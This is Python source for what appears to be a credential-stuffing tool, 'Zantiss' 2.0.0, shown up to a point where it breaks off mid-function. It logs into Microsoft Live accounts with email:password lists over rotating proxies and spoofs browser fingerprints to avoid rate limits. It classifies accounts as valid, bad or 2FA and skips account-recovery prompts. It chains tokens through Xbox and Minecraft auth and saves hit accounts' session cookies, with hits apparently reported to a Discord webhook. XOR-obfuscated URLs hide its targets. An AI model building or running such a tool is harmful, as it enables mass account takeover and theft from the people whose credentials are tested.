
import subprocess
import sys
import os as _os_boot

# --- _ensure ---
# Dependencies are auto-installed in dev mode (running from source).
# When frozen (inside PyInstaller/Nuitka), all deps are bundled at build time.
# Skipping pip when frozen prevents a recursive re-launch of the exe if
# sys.executable was not successfully repointed to a real Python interpreter.
def _ensure(pkg: str, import_as: str | None = None) -> None:
    try:
        __import__(import_as or pkg)
        return
    except ImportError:
        pass
    # In a frozen bundle, missing modules mean a build defect; do not attempt
    # to pip-install anything (sys.executable is the exe itself).
    if getattr(sys, "frozen", False):
        return
    # Only attempt pip if sys.executable looks like a real Python interpreter.
    exe = (sys.executable or "").lower()
    if not exe or "python" not in _os_boot.path.basename(exe):
        return
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "-q"])
    except Exception:
        pass  # fail silently; the import below will raise a clean error

for _pkg, _imp in [
    ("aiofiles",     "aiofiles"),
    ("rich",         "rich"),
    ("curl_cffi",    "curl_cffi"),
    ("cryptography", "cryptography"),
    ("requests",     "requests"),
]:
    _ensure(_pkg, _imp)

import asyncio
import hashlib
import json
import os
import random
import re
import struct
import uuid
from collections import deque
from dataclasses import dataclass, field
from datetime import datetime, timezone
from urllib.parse import parse_qs, urljoin, urlparse, unquote

import aiofiles


from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding as rsa_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

from curl_cffi.requests import AsyncSession
from curl_cffi.requests.exceptions import (
    ImpersonateError,
    RequestException as CurlRequestException,
    SSLError  as CurlSSLError,
    Timeout   as CurlTimeout,
)



_ZANTISS_VERSION = "2.0.0"

RUN_ID      = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
_base_dir = os.environ.get("ZANTISS_EXE_DIR")
if not _base_dir:
    _here = os.path.dirname(os.path.abspath(__file__))
    _base_dir = os.path.dirname(_here) if os.path.basename(_here) == "gui" else _here

RESULTS_DIR = os.path.abspath(os.path.join(_base_dir, "results", RUN_ID))
MISC_DIR    = os.path.abspath(os.path.join(RESULTS_DIR, "Misc"))
COOKIES_DIR = os.path.abspath(os.path.join(RESULTS_DIR, "Cookies"))
CONFIG_PATH = os.path.abspath(os.path.join(_base_dir, "config.json"))


_PREFERRED_TARGETS = [
    "chrome131", "chrome124", "chrome123", "chrome120",
    "chrome116", "chrome119", "edge101", "edge99",
]

# --- _valid_targets ---
def _valid_targets(preferred: list[str]) -> list[str]:
    try:
        from curl_cffi.requests.impersonate import BrowserTypeLiteral
        import typing
        supported = set(typing.get_args(BrowserTypeLiteral))
        valid = [t for t in preferred if t in supported]
        return valid or ["chrome120"]
    except Exception:
        return preferred

TARGETS = _valid_targets(_PREFERRED_TARGETS)

ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-CA,en;q=0.8,fr-CA;q=0.5",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
]

# --- class Config ---
class Config:
    DEFAULTS: dict = {
        "webhook":            "paste your discord webhook here",
        "max_retries":        3,
        "webhook_style":      "horizontal",
        "threads":            5,

        "session_max_uses":   10,
    }

    def __init__(self) -> None:
        data = self.DEFAULTS.copy()
        if not os.path.exists(CONFIG_PATH):
            try:
                with open(CONFIG_PATH, "w", encoding="utf-8") as f:
                    json.dump(self.DEFAULTS, f, indent=4)
            except Exception:
                pass
        else:
            try:
                with open(CONFIG_PATH, "r", encoding="utf-8") as f:
                    raw = f.read()
                clean = "\n".join(
                    ln.split(" //")[0].split(" #")[0] for ln in raw.splitlines()
                )
                data.update(json.loads(clean))
            except Exception:
                pass

        self.webhook          = str(data.get("webhook",          self.DEFAULTS["webhook"]))
        self.max_retries      = int(data.get("max_retries",      self.DEFAULTS["max_retries"]))
        self.webhook_style    = str(data.get("webhook_style",    self.DEFAULTS["webhook_style"])).lower()
        self.threads          = int(data.get("threads",          self.DEFAULTS["threads"]))

        try:
            self.session_max_uses = max(1, min(100, int(data.get(
                "session_max_uses", self.DEFAULTS["session_max_uses"]))))
        except Exception:
            self.session_max_uses = self.DEFAULTS["session_max_uses"]

        # Module toggles (all on by default) — honoured by the checking engine
        # so the GUI can enable/disable individual scans without touching code.
        _mods = data.get("modules", {}) if isinstance(data.get("modules"), dict) else {}
        self.modules = {
            "autobuy":          bool(_mods.get("autobuy",          True)),
            "wlid_claimer":      bool(_mods.get("wlid_claimer",      True)),
            "aml":              bool(_mods.get("aml",              True)),
            "aml_mc_only":      bool(_mods.get("aml_mc_only",      True)),
            "autotg":           bool(_mods.get("autotg",           True)),
            "rewards":          bool(_mods.get("rewards",          True)),
            "hypixel":          bool(_mods.get("hypixel",          True)),
            "donut":            bool(_mods.get("donut",            True)),
            "giftcodes":        bool(_mods.get("giftcodes",        True)),
            "refund":           bool(_mods.get("refund",           True)),
            "LinkedServicesCapture": bool(_mods.get("LinkedServicesCapture", True)),
        }
        _wh = data.get("webhook_events", {}) if isinstance(data.get("webhook_events"), dict) else {}
        self.webhook_events = {
            "hit":    bool(_wh.get("hit",    True)),
            "finish": bool(_wh.get("finish", True)),
            "error":  bool(_wh.get("error",  True)),
        }

config = Config()

# --- class RateLimiter ---
class RateLimiter:
    def __init__(self, base_delay: float = 0.05) -> None:
        self.base_delay  = base_delay
        self.delay       = base_delay
        self._last_req   = 0.0
        self._last_decay = 0.0
        self._lock: asyncio.Lock | None = None

    def _lk(self) -> asyncio.Lock:
        if self._lock is None:
            self._lock = asyncio.Lock()
        return self._lock

    async def acquire(self) -> None:
        async with self._lk():
            now = asyncio.get_running_loop().time()
            if proxies:
                effective = 0.001 + random.uniform(0.0005, 0.003)
            else:
                effective = max(self.base_delay, self.delay) + random.uniform(0.005, 0.02)
            self._last_req = max(self._last_req, now) + effective
            wait = self._last_req - now
            if self._last_decay == 0.0:
                self._last_decay = now
            elif now - self._last_decay > 0.5:
                self.delay = max(self.base_delay, self.delay * 0.75)
                self._last_decay = now
        if wait > 0:
            await asyncio.sleep(wait)

    def slow_down(self) -> None:
        self.delay = min(2.0, self.delay + 0.2)

rl_ms      = RateLimiter(0.03)
rl_xbox    = RateLimiter(0.01)
rl_mojang  = RateLimiter(0.01)
rl_session = RateLimiter(0.01)

proxies:     list[str]     = []
_pool:       list          = []
_pool_lock:  asyncio.Lock  = None
_file_lock:  asyncio.Lock  = None
_clone_lock: asyncio.Lock  = None

# --- _pl ---
def _pl() -> asyncio.Lock:
    global _pool_lock
    if _pool_lock is None:
        _pool_lock = asyncio.Lock()
    return _pool_lock

# --- _fl ---
def _fl() -> asyncio.Lock:
    global _file_lock
    if _file_lock is None:
        _file_lock = asyncio.Lock()
    return _file_lock

# --- _cl ---
def _cl() -> asyncio.Lock:
    global _clone_lock
    if _clone_lock is None:
        _clone_lock = asyncio.Lock()
    return _clone_lock

# --- _proxy_dict ---
def _proxy_dict(p: str | None) -> dict | None:
    return {"http": p, "https": p} if p else None

# --- _new_session ---
def _new_session() -> AsyncSession:
    imp   = random.choice(TARGETS)
    proxy = random.choice(proxies) if proxies else None
    sess  = AsyncSession(
        impersonate=imp,
        timeout=18,
        verify=False,
        proxies=_proxy_dict(proxy),
        headers={
            "Accept-Language": random.choice(ACCEPT_LANGUAGES),
            "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
            "Cache-Control":   "no-cache",
        },
    )
    sess._imp       = imp
    sess._proxy     = proxy
    sess._use_count = 0
    sess._dirty     = False
    sess._closed    = False
    return sess

# --- _close_sess ---
async def _close_sess(sess: AsyncSession) -> None:
    if sess is None or getattr(sess, "_closed", False):
        return
    try:
        sess._closed = True
        await sess.close()
    except Exception:
        pass

# --- get_session ---
async def get_session() -> AsyncSession:
    async with _pl():
        if _pool:
            sess = _pool.pop()
            proxy = random.choice(proxies) if proxies else None
            try:
                sess.proxies = _proxy_dict(proxy)
                sess._proxy  = proxy
                sess.cookies.clear()
            except Exception:
                pass
            return sess
    return _new_session()

# --- release_session ---
async def release_session(sess: AsyncSession) -> None:
    if getattr(sess, "_dirty", False):
        await _close_sess(sess)
        return
    sess._use_count = getattr(sess, "_use_count", 0) + 1
    if sess._use_count >= config.session_max_uses:
        await _close_sess(sess)
        return
    try:
        sess.cookies.clear()
    except Exception:
        pass
    async with _pl():
        _pool.append(sess)

# --- clone_session ---
async def clone_session(sess: AsyncSession) -> AsyncSession:
    imp   = getattr(sess, "_imp",   "chrome120")
    proxy = getattr(sess, "_proxy", None)
    clone = AsyncSession(
        impersonate=imp, timeout=18, verify=False,
        proxies=_proxy_dict(proxy),
    )
    clone._imp    = imp
    clone._proxy  = proxy
    clone._closed = False

    try:
        snapshot = list(sess.cookies.jar)
    except Exception:
        snapshot = []
    for c in snapshot:
        try:
            clone.cookies.jar.set_cookie(c)
        except Exception:
            pass
    return clone

# --- _is_ip_or_host ---
def _is_ip_or_host(s: str) -> bool:
    return bool(re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$", s) or "." in s)

# --- _is_port ---
def _is_port(s: str) -> bool:
    return s.isdigit() and 1 <= int(s) <= 65535

# --- parse_proxy ---
def parse_proxy(line: str, default_proto: str) -> str | None:
    line = line.strip()
    if not line:
        return None
    proto = default_proto.lower()
    for pr in ["socks5h://", "socks5://", "socks4a://", "socks4://", ("".join(chr(c^102)for c in[14, 18, 18, 22, 21, 92, 73, 73])), ("".join(chr(c^221)for c in[181, 169, 169, 173, 231, 242, 242]))]:
        if line.lower().startswith(pr):
            proto = pr.rstrip(":/")
            line  = line[len(pr):]
            break

    if "@" in line:
        first, second = line.split("@", 1)
        if ":" in first and ":" in second:
            f1, f2 = first.split(":", 1)
            s1, s2 = second.split(":", 1)
            if _is_port(f2) and _is_ip_or_host(f1):
                return f"{proto}://{s1}:{s2}@{f1}:{f2}"
            else:
                return f"{proto}://{f1}:{f2}@{s1}:{s2}"
        return f"{proto}://{line}"

    parts = line.split(":")
    if len(parts) == 2:
        if _is_ip_or_host(parts[0]) and _is_port(parts[1]):
            return f"{proto}://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        if _is_ip_or_host(parts[0]) and _is_port(parts[1]):
            return f"{proto}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif _is_ip_or_host(parts[2]) and _is_port(parts[3]):
            return f"{proto}://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"

    return f"{proto}://{line}"

# --- drop_proxy ---
def drop_proxy(url: str) -> None:
    if url and url in proxies:
        try:
            proxies.remove(url)
        except Exception:
            pass

# --- _test_proxy ---
async def _test_proxy(url: str) -> tuple[bool, float, str]:
    import time
    t0 = time.perf_counter()

    fallbacks = [url]
    if url.startswith(("".join(chr(c^169)for c in[193, 221, 221, 217, 218, 147, 134, 134]))):
        fallbacks.extend([url.replace(("".join(chr(c^99)for c in[11, 23, 23, 19, 16, 89, 76, 76])), ("".join(chr(c^182)for c in[222, 194, 194, 198, 140, 153, 153]))), url.replace(("".join(chr(c^142)for c in[230, 250, 250, 254, 253, 180, 161, 161])), "socks5h://")])
    elif url.startswith(("".join(chr(c^247)for c in[159, 131, 131, 135, 205, 216, 216]))):
        fallbacks.extend([url.replace(("".join(chr(c^41)for c in[65, 93, 93, 89, 19, 6, 6])), "socks5h://"), url.replace(("".join(chr(c^147)for c in[251, 231, 231, 227, 169, 188, 188])), "socks4a://")])
    elif "socks5h://" in url:
        fallbacks.extend([url.replace("socks5h://", "socks5://"), url.replace("socks5h://", ("".join(chr(c^156)for c in[244, 232, 232, 236, 166, 179, 179])))])
    elif "socks5://" in url:
        fallbacks.extend([url.replace("socks5://", "socks5h://"), url.replace("socks5://", ("".join(chr(c^141)for c in[229, 249, 249, 253, 183, 162, 162])))])
    elif "socks4a://" in url:
        fallbacks.extend([url.replace("socks4a://", "socks4://"), url.replace("socks4a://", ("".join(chr(c^105)for c in[1, 29, 29, 25, 83, 70, 70])))])
    elif "socks4://" in url:
        fallbacks.extend([url.replace("socks4://", "socks4a://"), url.replace("socks4://", ("".join(chr(c^40)for c in[64, 92, 92, 88, 18, 7, 7])))])

    for test_url in fallbacks:
        try:
            async with AsyncSession(
                impersonate="chrome120", timeout=3.5, verify=False,
                proxies={"http": test_url, "https": test_url},
            ) as s:
                r = await s.get(("".join(chr(c^59)for c in[83, 79, 79, 75, 72, 1, 20, 20, 87, 84, 92, 82, 85, 21, 87, 82, 77, 94, 21, 88, 84, 86, 20])), timeout=3.5)
                ms = (time.perf_counter() - t0) * 1000
                if r.status_code in (200, 302, 403, 429):
                    return True, ms, test_url
        except Exception:
            continue

    return False, 9999.0, url

# --- filter_proxies ---
async def filter_proxies(candidates: list[str]) -> list[str]:
    results: list[tuple[float, str]] = []
    sem = asyncio.Semaphore(250)

    async def _worker(p: str) -> None:
        async with sem:
            ok, ms, working_url = await _test_proxy(p)
            if ok:
                results.append((ms, working_url))

    await asyncio.gather(*(_worker(p) for p in candidates))
    results.sort(key=lambda x: x[0])

    working = [p for ms, p in results if ms <= 7000] or [p for _, p in results]
    return working

_dedup_cache:   set[str]        = set()
_sort_buckets:  dict[str, dict] = {}
_sort_counts:   dict[str, int]  = {}

# --- _const ---
async def _const(val):
    return val

# --- _read_text_lines ---
def _read_text_lines(path: str) -> list[str]:
    try:
        with open(path, "rb") as f:
            raw = f.read()
    except Exception:
        return []
    if not raw:
        return []

    if raw.startswith(b"\xef\xbb\xbf"):
        enc = "utf-8-sig"
    elif raw.startswith(b"\xff\xfe\x00\x00"):
        enc = "utf-32-le"
    elif raw.startswith(b"\x00\x00\xfe\xff"):
        enc = "utf-32-be"
    elif raw.startswith(b"\xff\xfe"):
        enc = "utf-16-le"
    elif raw.startswith(b"\xfe\xff"):
        enc = "utf-16-be"
    else:

        sample = raw[:4096]
        null_ratio = sample.count(b"\x00") / len(sample)
        if null_ratio > 0.30:
            even = sum(1 for i in range(0, len(sample), 2)
                        if sample[i] == 0)
            odd  = sum(1 for i in range(1, len(sample), 2)
                        if i < len(sample) and sample[i] == 0)
            enc = "utf-16-be" if even > odd else "utf-16-le"
        else:
            enc = "utf-8"

    try:
        text = raw.decode(enc, errors="replace")
    except Exception:
        text = raw.decode("latin-1", errors="ignore")

    text = text.lstrip("\ufeff")
    return [ln.strip() for ln in text.splitlines() if ln.strip()]

# --- _ensure_dir ---
def _ensure_dir(path: str) -> None:
    d = os.path.dirname(path)
    if d:
        os.makedirs(d, exist_ok=True)

# --- append_line ---
async def append_line(path: str, line: str) -> None:
    async with _fl():
        _ensure_dir(path)
        async with aiofiles.open(path, "a", encoding="utf-8") as f:
            await f.write(line + "\n")

# --- write_dedup ---
async def write_dedup(path: str, line: str, key: str) -> bool:
    async with _fl():
        if key in _dedup_cache:
            return False
        _dedup_cache.add(key)
        _ensure_dir(path)
        async with aiofiles.open(path, "a", encoding="utf-8") as f:
            await f.write(line + "\n")
        return True

# --- _flush_bucket ---
def _flush_bucket(path: str, bucket: dict) -> None:
    fmt   = bucket.get("_fmt", "{key} | {val}")
    items = sorted(
        ((k, v) for k, v in bucket.items() if not k.startswith("_")),
        key=lambda x: x[1][1],
        reverse=True,
    )
    _ensure_dir(path)
    with open(path, "w", encoding="utf-8") as f:
        for k, (v, _) in items:
            f.write(fmt.format(key=k, val=v) + "\n")

# --- write_sorted ---
async def write_sorted(
    path: str, entry_key: str, display_val: str, sort_by: float, fmt: str
) -> None:
    async with _fl():
        if path not in _sort_buckets:
            _sort_buckets[path] = {"_fmt": fmt}
        bucket = _sort_buckets[path]
        bucket[entry_key] = (display_val, sort_by)
        _sort_counts[path] = _sort_counts.get(path, 0) + 1
        if _sort_counts[path] % 10 == 1:
            _flush_bucket(path, bucket)

# --- flush_all_sorted ---
async def flush_all_sorted() -> None:
    async with _fl():
        for path, bucket in _sort_buckets.items():
            _flush_bucket(path, bucket)

# --- save_cookies ---
async def save_cookies(sess: AsyncSession, category: str, email: str, password: str) -> None:
    KEEP_DOMAINS = {
        ".live.com", ".microsoft.com", ".xbox.com",
        ".xboxlive.com", ".microsoftonline.com", ".bing.com",
    }
    try:
        safe   = re.sub(r'[/\\:*?"<>|]', "_", f"{email}_{password}")[:180]
        folder = f"{COOKIES_DIR}/{category}"
        os.makedirs(folder, exist_ok=True)
        lines  = ["# Netscape HTTP Cookie File", ""]
        try:
            snapshot = list(sess.cookies.jar)
        except Exception:
            snapshot = []
        for c in snapshot:
            domain = getattr(c, "domain", "") or ""
            if not any(domain.endswith(d) for d in KEEP_DOMAINS):
                continue
            name    = getattr(c, "name",    "") or ""
            value   = getattr(c, "value",   "") or ""
            path    = getattr(c, "path",    "/") or "/"
            secure  = "TRUE" if getattr(c, "secure", False) else "FALSE"
            expires = str(int(getattr(c, "expires", 0) or 0))
            sub_ok  = "TRUE" if domain.startswith(".") else "FALSE"
            lines.append(f"{domain}\t{sub_ok}\t{path}\t{secure}\t{expires}\t{name}\t{value}")
        if len(lines) <= 2:
            return
        async with _fl():
            async with aiofiles.open(f"{folder}/{safe}.txt", "w", encoding="utf-8") as f:
                await f.write("\n".join(lines) + "\n")
    except Exception:
        pass

# --- log_error ---
async def log_error(label: str, exc: Exception) -> None:
    try:
        os.makedirs(RESULTS_DIR, exist_ok=True)
        async with _fl():
            async with aiofiles.open(f"{RESULTS_DIR}/errors.txt", "a", encoding="utf-8") as f:
                await f.write(f"[{datetime.now():%H:%M:%S}] {label}: {exc}\n")
    except Exception:
        pass

# --- class Stats ---
class Stats:
    __slots__ = (
        "total", "checked", "hits", "bad", "twofa", "valid_mail",
        "errors", "retries", "cpm",
        "java", "bedrock", "gp_ultimate", "gp_pc", "other",
        "gift_codes", "promos", "refundable", "games",
        "aml_high", "aml_medium",
    )

    def __init__(self) -> None:
        for s in self.__slots__:
            setattr(self, s, 0)

stats:         Stats  = Stats()
checking_done: bool   = False
live_feed:     deque  = deque(maxlen=14)

# --- class AuthResult ---
@dataclass
class AuthResult:
    status:        str
    ms_token:      str = ""
    xbox_token:    str = ""
    uhs:           str = ""
    xsts_mc_token: str = ""
    mc_token:      str = ""
    details:       str = ""
    lang:          str = "en-US,en;q=0.9"

_AUTH_URL = (
    ("".join(chr(c^15)for c in[103, 123, 123, 127, 124, 53, 32, 32, 99, 96, 104, 102, 97, 33, 99, 102, 121, 106, 33, 108, 96, 98, 32, 96, 110, 122, 123, 103, 61, 63, 80, 110, 122, 123, 103, 96, 125, 102, 117, 106, 33, 124, 125, 105])) +
    "?client_id=00000000402B5328" +
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf" +
    "&scope=service::user.auth.xboxlive.com::MBI_SSL" +
    "&display=touch&response_type=token&locale=en"
)

# --- _parse_inputs ---
def _parse_inputs(html: str) -> dict[str, str]:
    inputs: dict[str, str] = {}
    for tag in re.findall(r"<input\s+[^>]*>", html, re.I):
        attrs: dict[str, str] = {}
        for m in re.finditer(
            r'(\b\w+)\s*=\s*(?:"([^"]*)"|\x27([^\x27]*)\x27|([^\s>]+))', tag, re.I
        ):
            attrs[m.group(1).lower()] = m.group(2) or m.group(3) or m.group(4) or ""
        name = attrs.get("name") or attrs.get("id")
        if name:
            inputs[name] = attrs.get("value", "")
    return inputs

# --- _unescape ---
def _unescape(s: str) -> str:
    try:
        return json.loads(f'"{s}"')
    except Exception:
        return (
            s.replace("\\u0026", "&")
             .replace("\\u003d", "=")
             .replace("\\u003f", "?")
             .replace("\\u002f", "/")
        )

# --- _extract_ppft ---
def _extract_ppft(html: str) -> str | None:
    m = re.search(r'name="PPFT"[^>]*value="([^"]+)"', html, re.I)
    if m:
        return m.group(1)
    m = re.search(r'value=\\?"([^"\\]{20,})\\?"', html, re.I)
    if m:
        return m.group(1)
    return None

# --- _classify_page ---
def _classify_page(text: str, url: str) -> str | None:
    low = text.lower()

    if any(s in text for s in [
        "recover?mkt", "identity/confirm", "proofup?mkt=", "/Abuse?mkt=",
        "password/change", "password/reset", "/proofs/", "Email/Confirm",
        "account.live.com/acsr",
    ]) or any(s in low for s in [
        "help us protect your account", "verify your identity",
        "blocked your sign-in",
    ]):
        return "two_fa"

    if any(s in low for s in [
        "password is incorrect",
        "your account or password is incorrect",
        "incorrect account or password",
        "account doesn't exist",
        "account doesn\\u0027t exist",
        "0x80048821",
        '"serrorcode":"1006"',
        '"serrorcode":"81012414"',
        '"serrorcode":"80046709"',
        "stimmt nicht",
    ]):
        return "bad"

    if "account.live.com" not in url and any(s in low for s in [
        "tried to sign in too many times",
        "you can try again later",
        "please wait a few minutes",
        "solve the puzzle",
        "beat the robots",
        "unusual traffic",
        '"serrorcode":"1200"',
        '"serrorcode":"81012405"',
    ]):
        return "rate_limited"

    return None

# --- _follow_oauth ---
async def _follow_oauth(
    sess: AsyncSession,
    start_url: str,
    base_h: dict,
    form_h: dict,
) -> str:
    url    = start_url
    method = "GET"
    data   = None
    hdrs   = base_h

    for _ in range(14):
        try:
            if method == "POST":
                r = await sess.post(url, data=data, headers=hdrs, allow_redirects=False, timeout=14)
            else:
                r = await sess.get(url, headers=hdrs, allow_redirects=False, timeout=14)
        except Exception:
            break

        loc    = r.headers.get("Location", "")
        target = loc or str(r.url)

        if "#" in target:
            tok = parse_qs(urlparse(target).fragment).get("access_token", [None])[0]
            if tok:
                return tok
            break

        if r.status_code in (301, 302, 303, 307, 308) and loc:
            url    = loc if loc.startswith("http") else urljoin(url, loc)
            method = "GET"
            data   = None
            hdrs   = base_h
            continue

        txt = r.text

        if "account.live.com" in str(r.url):
            parsed_u = urlparse(str(r.url))
            qs = parse_qs(parsed_u.query)
            ru = qs.get("ru", [None])[0]
            if not ru:
                m_ru = re.search(r'action="[^"]*ru=([^"&]+)', txt)
                if m_ru:
                    ru = unquote(m_ru.group(1))
            if ru:
                url    = unquote(ru)
                method = "GET"
                data   = None
                hdrs   = base_h
                continue

            skipped = False
            for pat in [
                r'"skip":\{"url":"(.+?)"',
                r'"return":\{"url":"(.+?)"',
                r'"cancel":\{"url":"(.+?)"',
                r'"recoveryCancel":\{"returnUrl":"(.+?)"',
            ]:
                m = re.search(pat, txt)
                if m:
                    url    = _unescape(m.group(1))
                    method = "GET"
                    data   = None
                    hdrs   = base_h
                    skipped = True
                    break
            if skipped:
                continue
            break

        if "<form" in txt:
            frm = re.search(r'<form[^>]*>', txt, re.I)
            act = re.search(r'action="([^"]+)"', frm.group(0), re.I) if frm else None
            if act:
                action = act.group(1).replace("&amp;", "&")
                url    = action if action.startswith("http") else urljoin(str(r.url), action)
                data   = _parse_inputs(txt)
                method = "POST"
                hdrs   = form_h
                continue
        break

    return ""

# --- authenticate ---
async def authenticate(email: str, password: str, sess: AsyncSession) -> AuthResult:
    lang   = random.choice(ACCEPT_LANGUAGES)
    base_h = {
        "Accept-Language": lang,
        "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
        "Cache-Control":   "no-cache",
    }
    form_h = {
        **base_h,
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin":       ("".join(chr(c^68)for c in[44, 48, 48, 52, 55, 126, 107, 107, 40, 43, 35, 45, 42, 106, 40, 45, 50, 33, 106, 39, 43, 41])),
        "Referer":      _AUTH_URL,
    }
    json_h = {
        "Accept":          "application/json",
        "Accept-Language": lang,
        "Content-Type":    "application/json",
    }

    await rl_ms.acquire()
    try:
        r = await sess.get(_AUTH_URL, headers=base_h)
    except Exception as e:
        return AuthResult("error", details=f"MS GET: {type(e).__name__}")

    if r.status_code == 429:
        rl_ms.slow_down()
        return AuthResult("rate_limited")
    if r.status_code != 200:
        return AuthResult("error", details=f"MS GET {r.status_code}")

    html = r.text
    ppft = _extract_ppft(html)

    url_m = (
        re.search(r'"urlPost"\s*:\s*"(.+?)"', html)
        or re.search(r"urlPost\s*[:=]\s*'(.+?)'", html)
    )
    if not ppft or not url_m:
        return AuthResult("error", details="Missing PPFT or urlPost")

    url_post   = _unescape(url_m.group(1))
    canary_m   = re.search(r'"apiCanary"\s*:\s*"((?:[^"\\]|\\.)+)"', html)
    api_canary = _unescape(canary_m.group(1)) if canary_m else ""

    form_data = {
        "i13": "0", "login": email, "loginfmt": email, "type": "11",
        "LoginOptions": "3", "lrt": "", "lrtPartition": "", "hisRegion": "",
        "hisScaleUnit": "", "passwd": password, "ps": "2",
        "psRNGCDefaultType": "", "psRNGCEntropy": "", "psRNGCSLK": "",
        "canary": api_canary, "ctx": "", "hpgrequestid": "", "PPFT": ppft,
        "PPSX": "PassportR", "NewUser": "1", "FoundMSAs": "", "fspost": "0",
        "i21": "0", "CookieDisclosure": "0", "IsFidoSupported": "1",
        "isSignupPost": "0", "isRecoveryAttemptPost": "0", "i19": "449894",
    }
    ms_token: str | None = None
    last_html            = ""

    url, method, data, hdrs = url_post, "POST", form_data, form_h
    for _ in range(25):
        await rl_ms.acquire()
        try:
            if method == "POST":
                r = await sess.post(url, data=data, headers=hdrs, allow_redirects=False)
            else:
                r = await sess.get(url, headers=hdrs, allow_redirects=False)
        except Exception as e:
            px = getattr(sess, "_proxy", None)
            if px:
                drop_proxy(px)
            return AuthResult("error", details=f"Redirect: {type(e).__name__}")

        if r.status_code == 429:
            rl_ms.slow_down()
            return AuthResult("rate_limited")

        text   = r.text
        status = r.status_code
        cur    = str(r.url)
        last_html = text
        loc    = r.headers.get("Location", "")
        target = loc or cur

        if "#" in target:
            frag = parse_qs(urlparse(target).fragment)
            tok  = frag.get("access_token", [None])[0]
            if tok:
                ms_token = tok
                break
            if frag.get("error"):
                return AuthResult("two_fa")

        if "account.live.com" in cur:
            parsed_u = urlparse(cur)
            qs = parse_qs(parsed_u.query)
            ru = qs.get("ru", [None])[0]
            if not ru:
                m_ru = re.search(r'action="[^"]*ru=([^"&]+)', text)
                if m_ru:
                    ru = unquote(m_ru.group(1))
            if ru:
                url    = unquote(ru)
                method = "GET"
                data   = None
                hdrs   = base_h
                continue

            skipped = False
            for pat in [
                r'"skip":\{"url":"(.+?)"',
                r'"return":\{"url":"(.+?)"',
                r'"cancel":\{"url":"(.+?)"',
                r'"recoveryCancel":\{"returnUrl":"(.+?)"',
            ]:
                m2 = re.search(pat, text)
                if m2:
                    url    = _unescape(m2.group(1))
                    method = "GET"
                    data   = None
                    hdrs   = base_h
                    skipped = True
                    break
            if skipped:
                continue

        page_state = _classify_page(text, cur)
        if page_state:
            return AuthResult(page_state)

        if status in (301, 302, 303, 307, 308) and loc:
            url = loc if loc.startswith("http") else urljoin(url, loc)
            if status in (301, 302, 303):
                method = "GET"
                data   = None
                hdrs   = base_h
            continue

        if "<form" in text:
            frm = (
                re.search(r'<form[^>]*id="fmHF"[^>]*>', text, re.I)
                or re.search(r'<form[^>]*>', text, re.I)
            )
            if frm:
                act_m = re.search(r'action="([^"]+)"', frm.group(0), re.I)
                if act_m:
                    action = act_m.group(1).replace("&amp;", "&")
                    url    = action if action.startswith("http") else urljoin(cur, action)
                    parsed = _parse_inputs(text)
                    if "PPFT" not in parsed and ppft:
                        parsed["PPFT"] = ppft
                    method = "POST"
                    data   = parsed
                    hdrs   = form_h
                    continue
        break

    if not ms_token:
        low = last_html.lower()
        if any(s in low for s in [
            "tried to sign in too many times", "please wait a few minutes",
            '"serrorcode":"1200"',
        ]):
            return AuthResult("rate_limited")
        if any(s in low for s in [
            "password is incorrect", "account doesn't exist",
            '"serrorcode":"1006"', "0x80048821",
        ]):
            return AuthResult("bad")
        if any(s in last_html for s in [
            "recover?mkt", "proofup?mkt=", "identity/confirm",
        ]):
            return AuthResult("two_fa")
        return AuthResult("error", details="Token not found")

    await rl_xbox.acquire()
    try:
        r = await sess.post(
            ("".join(chr(c^227)for c in[139, 151, 151, 147, 144, 217, 204, 204, 150, 144, 134, 145, 205, 130, 150, 151, 139, 205, 155, 129, 140, 155, 143, 138, 149, 134, 205, 128, 140, 142, 204, 150, 144, 134, 145, 204, 130, 150, 151, 139, 134, 141, 151, 138, 128, 130, 151, 134])),
            json={
                "Properties": {
                    "AuthMethod": "RPS",
                    "SiteName":   "user.auth.xboxlive.com",
                    "RpsTicket":  ms_token,
                },
                "RelyingParty": ("".join(chr(c^161)for c in[201, 213, 213, 209, 155, 142, 142, 192, 212, 213, 201, 143, 217, 195, 206, 217, 205, 200, 215, 196, 143, 194, 206, 204])),
                "TokenType":    "JWT",
            },
            headers=json_h,
        )
    except Exception as e:
        return AuthResult("error", ms_token=ms_token, details=f"Xbox: {e}")

    if r.status_code == 429:
        rl_xbox.slow_down()
        return AuthResult("rate_limited")

    if r.status_code in (400, 401):
        try:
            xerr = r.json().get("XErr") or r.json().get("xErr")
            if xerr in (2148916233, 2148916235, 2148916238):
                return AuthResult("no_xsts", ms_token=ms_token)
        except Exception:
            pass
        return AuthResult("no_xsts", ms_token=ms_token)

    try:
        xj         = r.json()
        xbox_token = xj["Token"]
        uhs        = xj["DisplayClaims"]["xui"][0]["uhs"]
    except Exception:
        return AuthResult("no_xsts", ms_token=ms_token)

    await rl_xbox.acquire()
    try:
        r = await sess.post(
            ("".join(chr(c^228)for c in[140, 144, 144, 148, 151, 222, 203, 203, 156, 151, 144, 151, 202, 133, 145, 144, 140, 202, 156, 134, 139, 156, 136, 141, 146, 129, 202, 135, 139, 137, 203, 156, 151, 144, 151, 203, 133, 145, 144, 140, 139, 150, 141, 158, 129])),
            json={
                "Properties":   {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": "rp://api.minecraftservices.com/",
                "TokenType":    "JWT",
            },
            headers=json_h,
        )
    except Exception as e:
        return AuthResult(
            "error", ms_token=ms_token, xbox_token=xbox_token,
            uhs=uhs, details=f"XSTS: {e}",
        )

    if r.status_code == 429:
        rl_xbox.slow_down()
        return AuthResult("rate_limited")

    try:
